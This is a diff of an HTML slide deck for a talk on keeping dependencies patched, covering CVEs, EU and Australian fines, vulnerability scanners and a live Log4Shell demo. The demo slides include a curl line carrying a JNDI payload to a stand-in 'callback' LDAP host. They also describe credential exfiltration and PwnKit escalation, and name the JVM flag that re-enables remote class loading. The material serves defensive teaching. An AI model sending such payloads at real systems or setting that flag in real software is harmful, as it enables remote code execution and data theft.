@@ -8,6 +8,10 @@
     </section>
 
     <section>
+        <img src="pictures/Sculpture.jpg" class="r-stretch">
+    </section>
+
+    <section>
         <h2>Dependencies</h2>
         <div class="puml-wrap">
             <img data-puml-src="architecture.puml" alt="Nested rectangles: a Docker image or virtual machine contains operating system packages, which contain the runtime, which contains the application, which contains its application dependencies.">
@@ -26,23 +30,23 @@
 
 
     <section>
-        <h2>🚨 The "It Works, Don't Touch It" Trap</h2>
+        <h2>🚨 It Works, Don't Touch It</h2>
         <div class="medium">
-            <p style="font-style:italic;color:#6c71c4;">"Projects don't drift maliciously: just one sprint at a time."</p>
             <ul class="icon-list" style="margin-top:0.8em;">
                 <li><span class="ic">🧩</span><span>Every application has <strong>direct</strong> and <strong>transitive</strong> dependencies, often hundreds</span></li>
-                <li><span class="ic">✅</span><span>You consciously chose a small fraction of them</span></li>
-                <li><span class="ic">🎲</span><span>Each carries potential Common Vulnerabilities and Exposures (CVEs)</span></li>
+                <li><span class="ic">✅</span><span>Most are hidden</span></li>
+                <li><span class="ic">🎲</span><span>Potential Common Vulnerabilities and Exposures (CVEs)</span></li>
             </ul>
         </div>
+    </section>
+
+    <section>
         <div class="box box-blue medium" style="margin-top:0.8em;">
             <span class="java-pill">☕ Java example</span><br>
             A typical Spring Boot app: <strong>50–80 direct</strong>, <strong>200–400 transitive</strong> dependencies.<br>
             <code>./mvnw dependency:tree | wc -l</code>. Prepare to be surprised.
         </div>
     </section>
-
-
 
     <section>
         <h2>The Compounding Cost of Delay</h2>
@@ -53,6 +57,9 @@
                 <li><span class="ic">🧗</span><span><strong>Migration effort:</strong> small incremental hops are easy; multi-year jumps require dedicated projects</span></li>
             </ul>
         </div>
+    </section>
+
+    <section>
         <div class="box box-blue medium" style="margin-top:0.8em;">
             <span class="java-pill">☕ Java example</span><br>
             Java 8 → 21 in one jump: complex module-system breakage, API removals, GC changes.<br>
@@ -91,27 +98,24 @@
                     <tr><td>Final report</td><td>14 days / 1 month</td><td>Root cause and the fix (vulnerability / incident)</td></tr>
                 </tbody>
             </table>
-            <p class="small" style="margin-top:0.4em;">Applies to products already on the market too, not just new releases; the exact discipline this talk keeps coming back to is about to be law.</p>
         </div>
     </section>
 
     <section>
         <h2>🇪🇺 EU: Already Being Enforced</h2>
         <div class="medium">
-            <p>The Cyber Resilience Act's clock hasn't started yet, but GDPR and NIS2 already have real fines on the books, some of them for exactly this: unpatched systems and slow reporting.</p>
+            <p>Example fines based on the older GDPR and NIS2 regulations.</p>
         </div>
         <div class="box box-red medium" style="margin-top:0.6em;">
-            <strong>⚖️ Same discipline, older laws:</strong> GDPR Art. 32 already treats "we knew about the risk and didn't patch" as an aggravating factor; NIS2's first enforcement wave (member states through 2025–2026) is punishing missed reporting deadlines and missing risk-management programs, the same discipline the CRA table above adds vulnerability disclosure to.
             <table style="margin-top:0.4em;">
                 <thead><tr><th>Case</th><th>What happened</th></tr></thead>
                 <tbody>
                     <tr><td>Poland, GDPR (UODO), 2023</td><td>€6,700 fine: an unsupported operating system and an outdated antivirus signature database, both risks the controller had already identified but never patched, let a ransomware attack in.</td></tr>
                     <tr><td>Belgium, NIS2, 2025</td><td>€185,000 fine on a healthcare provider for missing the 24-hour early-warning deadline; its CEO was personally fined €15,000 and ordered into mandatory training.</td></tr>
-                    <tr><td>Italy, NIS2, 2025</td><td>€450,000 fine on a cloud provider for having no risk-management programme in place at all.</td></tr>
+                    <tr><td>Italy, NIS2, 2025</td><td>€450,000 fine on a cloud provider for having no risk-management program in place at all.</td></tr>
                 </tbody>
             </table>
         </div>
-        <p class="small" style="margin-top:0.6em;color:#657b83;">Figures current as of 2026; verify before citing exact numbers in your own compliance work.</p>
     </section>
 
     <section>
@@ -130,7 +134,6 @@
     <section>
         <h2>⚖️ Australia: What Actually Gets Fined</h2>
         <div class="box box-red medium" style="margin-top:0.6em;">
-            <strong>⚖️ What actually triggers a fine:</strong> under the Privacy Act, it's not the breach itself, it's a <strong>failure to take "reasonable steps"</strong> to secure personal data, or a late/non-compliant breach notification. Under the Cyber Security Act, it's failing to report a ransomware/extortion payment your business made within <strong>72 hours of paying it</strong> (turnover &gt; $3M AUD, or critical-infrastructure entities).
             <table style="margin-top:0.4em;">
                 <thead><tr><th>Case</th><th>What happened</th></tr></thead>
                 <tbody>
@@ -139,7 +142,6 @@
                 </tbody>
             </table>
         </div>
-        <p class="small" style="margin-top:0.6em;color:#657b83;">Figures current as of 2026; verify before citing exact numbers in your own compliance work.</p>
     </section>
 
     <section>
@@ -157,7 +159,6 @@
         </div>
         <p class="medium" style="margin-top:0.8em;">
             Industry benchmark: critical CVE → patched in production within <strong style="color:#dc322f;">72 hours</strong>.<br>
-            You cannot hit that with manual quarterly updates.
         </p>
     </section>
 
@@ -197,7 +198,6 @@
         <h2>Improved Performance after Upgrading Java</h2>
         <div class="box box-blue medium" style="margin-top:0.5em;">
             <span class="java-pill">🔮 Java 25 → 28 EA: Valhalla preview</span>
-            Same benchmark, one keyword: <code>record Point</code> → <code>value record Point</code>.
             Verified (not assumed from the JEP): <strong>~60% less memory</strong> and <strong>4-8x faster</strong>, but only once fields are narrow enough to fit the JVM's current flattening size limit.
         </div>
     </section>
@@ -220,7 +220,6 @@
 
     <section>
         <h2>🧨 Anatomy of the Exploit Chain</h2>
-        <p class="subtitle">Victim, attacker, and the callback server in between</p>
         <div class="medium" style="max-width:860px;margin:0.4em auto 0;">
             <svg viewBox="0 0 900 430" style="width:100%;height:auto;" role="img"
                  aria-label="The attacker sends one curl request carrying a JNDI payload to the victim application. The victim's Log4j resolves the lookup by contacting the attacker's LDAP server on port 1389, which answers with a reference to a malicious class. The victim then downloads and executes that class from the attacker's HTTP server on port 9999, exfiltrating recon and credential data back to the same server, where a live dashboard logs it. Optionally, if the victim process is not already root, it attempts the PwnKit privilege-escalation exploit locally.">
@@ -294,18 +293,16 @@
 
     <section>
         <h2>🎯 Log4Shell → Remote Code Execution (RCE) → PwnKit</h2>
-        <p class="subtitle">One curl command, real network hops, on the projector</p>
         <div class="medium">
             <ul class="icon-list" style="margin-top:0.6em;">
                 <li><span class="ic">🎯</span><span>A REST endpoint build with Java 11 / Spring Boot 2.7 app running <code>log4j-core 2.14.1</code> (pre-patch)</span></li>
                 <li><span class="ic">📡</span><span>One query string triggers a JNDI lookup against an "attacker" LDAP server</span></li>
                 <li><span class="ic">💀</span><span>The attacker's class loads on the victim: recon, credential/env-var theft, exfiltration</span></li>
-                <li><span class="ic">🔓</span><span>If the victim isn't already root, it then tries <strong>CVE-2021-4034 (PwnKit)</strong> to escalate</span></li>
+                <li><span class="ic">🔓</span><span>If the victim isn't already root, it then tries <strong>CVE-2021-4034 (PwnKit targets pkexec)</strong> to escalate</span></li>
             </ul>
         </div>
         <div class="box box-red medium" style="margin-top:0.6em;">
             <pre><code class="language-bash">curl "http://victim:8080/api/products/search?q=\${jndi:ldap://callback:1389/pwnkit}"</code></pre>
-            <p class="small" style="margin:0.3em 0 0;">Everything the exploit steals gets logged live on the attacker's own dashboard: <code>http://localhost:9999/dashboard/live</code>, built to be watched on a projector.</p>
         </div>
     </section>
 
@@ -327,14 +324,22 @@
         <p class="subtitle">The log4j jar itself is never patched</p>
         <div class="box box-blue medium" style="margin-top:0.6em;">
             <span class="java-pill">☕ Java example</span>
-            All three images ship the exact same <code>log4j-core 2.14.1</code>, still vulnerable, still doing the JNDI lookup. What differs is one JVM flag:
-            <pre><code class="language-bash"># root & escalation images deliberately force the flag back on
--Dcom.sun.jndi.ldap.object.trustURLCodebase=true
-
-# safe image sets nothing → gets Java 25's own default: false</code></pre>
-            Oracle disabled remote JNDI class-loading by default years before Log4Shell existed (JDK 6u211 / 7u201 / 8u191 / 11.0.1+). The root/escalation Dockerfiles have to explicitly re-enable it just to make the RCE fire; the safe image simply doesn't, so log4j still performs the lookup, but the malicious class never loads.
+            <code>log4j-core 2.14.1</code>, still vulnerable, still doing the JNDI lookup. What differs is one JVM flag:
+            <pre><code class="language-bash"># The issue
+-Dcom.sun.jndi.ldap.object.trustURLCodebase=true</code></pre>
+            Oracle disabled remote JNDI class-loading by default years before Log4Shell existed (JDK 6u211 / 7u201 / 8u191 / 11.0.1+).
         </div>
-        <p class="small" style="margin-top:0.5em;">Defense in depth backstops the same trick anyway: even without that flag, <code>vuln-app:safe</code> has no <code>curl</code>/<code>wget</code> to fetch a second-stage payload, no <code>gcc</code> to compile one, no <code>pkexec</code> to escalate through, and isn't running as root.</p>
+    </section>
+
+    <section>
+        <h2>Defense in depth</h2>
+        <p class="subtitle">Secure the Docker container</p>
+        <ul class="icon-list">
+            <li><span class="ic">??</span><span>No <code>curl</code>/<code>wget</code> to fetch a payload</span></li>
+            <li><span class="ic">??</span><span>No <code>gcc</code> to compile applications</span></li>
+            <li><span class="ic">??</span><span>No <code>pkexec</code> to escalate through</span></li>
+            <li><span class="ic">??</span><span>No root access</span></li>
+        </ul>
     </section>
 
     <section>
@@ -355,11 +360,9 @@
 
     <section>
         <h2>🔍 Two Layers of Scanning</h2>
-        <p class="subtitle">They find different things; you need both</p>
         <div class="two-col small" style="margin-top:0.8em;">
             <div class="box box-blue">
                 <h3>Layer 1: Source / Build Time</h3>
-                <p><em>What you declared</em></p>
                 <ul class="icon-list">
                     <li><span class="ic">📄</span><span>Scans your dependency manifest</span></li>
                     <li><span class="ic">⚡</span><span>Fast, integrates with CI</span></li>
@@ -368,7 +371,6 @@
             </div>
             <div class="box box-green">
                 <h3>Layer 2: Runtime / Image</h3>
-                <p><em>What actually ships</em></p>
                 <ul class="icon-list">
                     <li><span class="ic">🐳</span><span>Scans OS packages + language libs in the artifact</span></li>
                     <li><span class="ic">🔎</span><span>Finds what build-time scanning misses</span></li>
@@ -459,16 +461,7 @@ osv-scanner scan --sbom=target/bom.json .</code></pre>
     </section>
 
     <section>
-        <h2>Different Tools, Different Databases, Different Results</h2>
-        <div class="medium">
-            <ul class="icon-list">
-                <li><span class="ic">🌐</span><span><strong>Grype</strong>: Anchore's own feed</span></li>
-                <li><span class="ic">🌐</span><span><strong>Trivy</strong>: Aqua's feed, widest DB coverage</span></li>
-                <li><span class="ic">🌐</span><span><strong>OSV-Scanner</strong>: the open OSV.dev database</span></li>
-                <li><span class="ic">☕</span><span><strong>OWASP Dependency Check</strong>: the NVD database</span></li>
-            </ul>
-            <p style="margin-top:0.6em;">No two tools agree on every finding. Run more than one for full coverage.</p>
-        </div>
+        <img src="pictures/SearchS.jpg" class="r-stretch">
     </section>
 
     <section>
@@ -503,7 +496,6 @@ osv-scanner scan --sbom=target/bom.json .</code></pre>
                 <li>CVE-2022-22965: a critical RCE in the Spring framework itself, not a bundled library this time</li>
                 <li>Teams on old Spring versions couldn't patch directly; they had to upgrade the framework first</li>
             </ul>
-            <p class="small" style="margin-top:0.5em;color:#cb4b16;">The version gap turned a one-day fix into a multi-week project.</p>
         </div>
     </section>
 
